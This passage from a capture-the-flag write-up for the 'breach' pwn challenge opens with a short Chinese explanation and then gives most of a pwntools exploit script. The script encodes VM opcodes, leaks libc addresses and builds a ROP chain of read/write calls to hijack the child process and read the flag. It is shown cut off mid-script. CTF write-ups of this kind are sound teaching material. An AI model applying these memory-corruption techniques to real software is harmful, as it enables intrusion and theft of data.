+<p>控制父进程后，由于不能使用open，还是不能打开flag。但是子进程没有这个限制，在strace中我们可以看到子进程会先读取父进程传递的输入的size，而且调试后可以发现子进程也是向代码段读取输入，并且会回到0x4bc执行虚拟机指令。同理我们可以给子进程一个很大的size，发送payload覆盖子进程的虚拟机指令，然后在子进程中实现fake_stack的栈溢出。从而控制子进程读取flag，并返回给父进程。父进程读取并输出即可。</p>
+<h3 id="exp" class="headerLink">
+    <a href="#exp" class="header-mark"></a>Exp</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="se">\t</span><span class="s1">---&gt;</span><span class="se">\t</span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">binary</span> <span class="o">=</span> <span class="s1">&#39;./breach&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="s1">&#39;./libc.so.6&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># context.binary = binary</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># context.log_level=&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># p = gdb.debug([&#34;./breach&#34;, &#34;./breach.bin&#34;], &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               b fopen</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               follow child</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#               &#39;&#39;&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span>  <span class="mi">31618</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">alu_list</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;+&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;-&#34;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;*&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;%&#34;</span><span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&amp;&#34;</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;|&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;^&#34;</span><span class="p">:</span> <span class="mi">6</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&gt;&gt;&#34;</span><span class="p">:</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Exit</span><span class="p">():</span> <span class="c1"># 1</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Mov_r_i</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span> <span class="c1"># 9</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">((</span><span class="n">dst</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Mov_r_r</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">src</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">dst</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Alu</span><span class="p">(</span><span class="n">op</span><span class="p">,</span> <span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">((</span><span class="n">alu_list</span><span class="p">[</span><span class="n">op</span><span class="p">]</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">src</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">dst</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Mov_d_r</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">src</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">dst</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Mov_r_d</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">dst</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Mov_r_c</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">):</span> <span class="c1"># 2</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">dst</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">src</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Jmp_i</span><span class="p">(</span><span class="n">imm</span><span class="p">):</span>  <span class="c1"># 9   </span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Jmp_r</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">((</span><span class="n">reg</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Cmp_j</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">imm</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">((</span><span class="n">dst</span><span class="o">&lt;&lt;</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">src</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">imm</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Show</span><span class="p">(</span><span class="n">reg</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">reg</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">Showall</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">opcode</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">opcode</span> <span class="o">+=</span> <span class="n">p8</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">opcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">r0 = 0x8
+</span></span></span><span class="line"><span class="cl"><span class="s1">r1 = 0x28
+</span></span></span><span class="line"><span class="cl"><span class="s1">r2 = libc base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r3 = text base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r4 = (fake_stack - data segment) + 0x150
+</span></span></span><span class="line"><span class="cl"><span class="s1">r5 = offset(csdata - cs)
+</span></span></span><span class="line"><span class="cl"><span class="s1">r6 = text base
+</span></span></span><span class="line"><span class="cl"><span class="s1">r7 = stack return addr
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">r8 = 1              ; rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">r9 = 0              ; rdi
+</span></span></span><span class="line"><span class="cl"><span class="s1">r10 = 0x7fb0        ; rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">r11 = fake_stack    ; rdx
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x28</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Show</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># read(0, fake_stack, 0x2873)</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Mov_r_r</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span>   <span class="c1"># rax = 0 rdi = 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Mov_r_r</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span> <span class="c1"># rsi = fake_stack</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Mov_r_r</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span>  <span class="c1"># rdx = 0x2873</span>
+</span></span><span class="line"><span class="cl"><span class="n">insns</span> <span class="o">+=</span> <span class="n">Jmp_i</span><span class="p">(</span><span class="mh">0x2353</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">insns</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span> <span class="c1"># trigger</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;r2 = 0x&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span><span class="p">(</span><span class="s1">&#39;libc base&#39;</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;r11 = 0x&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="kc">True</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span><span class="p">(</span><span class="s1">&#39;fake_stack&#39;</span><span class="p">,</span> <span class="n">fake_stack</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000026b72</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000027529</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_r12</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000011c371</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, we control parent to interactive with child</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># give it a large size to overflow child&#39;s rom and control it</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mh">0xa0</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># parent read size</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write(5, fake_stack, 8) to child</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># parent read payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write(5, fake_stack, 0x1000) to child</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># parent read orw payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write(5, fake_stack, 0x1000) to child</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;write&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># read flag from child</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_stack</span><span class="o">-</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;read&#34;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write flag to stdout</span>
